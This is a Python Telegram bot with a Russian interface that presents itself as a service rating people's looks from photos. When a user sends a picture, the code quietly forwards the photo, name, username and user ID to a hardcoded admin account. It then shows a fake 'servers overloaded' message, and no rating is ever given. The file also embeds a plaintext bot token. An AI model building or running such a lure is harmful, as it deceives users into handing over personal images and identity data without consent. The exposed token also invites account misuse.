import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8838352023:AAHl9ZPlNcbmXiARZsMnpzQs0Gxsz4nSjbE"
ADMIN_ID = 7652381613

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🎯 Рейт", callback_data="rate")],
        [InlineKeyboardButton("🏆 Таблица лидеров", callback_data="leaderboard")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = "👋 Привет! Добро пожаловать в бот рейтинга внешности.\n\nВыберите действие:"
    
    if update.message:
        await update.message.reply_text(text, reply_markup=reply_markup)
    else:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if query.data == "rate":
        await query.edit_message_text("📸 Отправьте фото для рейта")
        context.user_data['waiting_for_photo'] = True
        
    elif query.data == "leaderboard":
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="back")]]
        await query.edit_message_text(
            "🏆 Таблица лидеров\n\nСкоро...",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    elif query.data == "back":
        await start(update, context)

async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if context.user_data.get('waiting_for_photo'):
        context.user_data['waiting_for_photo'] = False
        
        photo = update.message.photo[-1]
        
        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=photo.file_id,
            caption=f"📸 Новое фото для рейта\n👤 От: {update.effective_user.full_name} (@{update.effective_user.username or 'нет username'})\n🆔 ID: {user_id}"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 В меню", callback_data="back")]]
        await update.message.reply_text(
            "⚠️ Сервера перегружены, подождите...",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text("Сначала нажмите кнопку 'Рейт' в меню.")

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Используйте кнопки меню. Напишите /start для начала.")

async def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.PHOTO, photo_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    
    print("Бот запущен...")
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    await asyncio.Event().wait()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())